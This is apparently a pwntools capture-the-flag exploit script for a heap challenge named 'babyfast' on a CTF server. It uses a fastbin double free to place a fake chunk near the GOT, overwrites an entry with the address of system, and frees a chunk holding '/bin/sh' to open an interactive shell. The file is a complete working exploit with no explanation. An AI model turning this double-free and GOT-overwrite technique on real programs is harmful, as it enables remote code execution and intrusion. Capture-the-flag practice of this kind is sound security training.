#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

r = remote("csie.ctf.tw", 10142)
#r = process("./babyfast")
#gdb.attach(proc.pidof(r)[0])

def allocate(size, data):
    print("allocate", size, data)
    r.sendlineafter(':', "1")
    r.sendlineafter(':', str(size))
    r.sendlineafter(':', data)

def free(index):
    print("free", index)
    r.sendlineafter(':', "2")
    r.sendlineafter(':', str(index))

fake_chunk = 0x601ffa
system = 0x4007d0

allocate(0x50, 'jedi')
allocate(0x50, 'jedi')
allocate(0x50, 'jedi')

free(0)
free(1)
free(0) 

allocate(0x50, p64(fake_chunk))
allocate(0x50, '/bin/sh\x00')
allocate(0x50, 'jedi')

allocate(0x50, b'A' * 14 + p64(system))

free(4)

r.interactive()
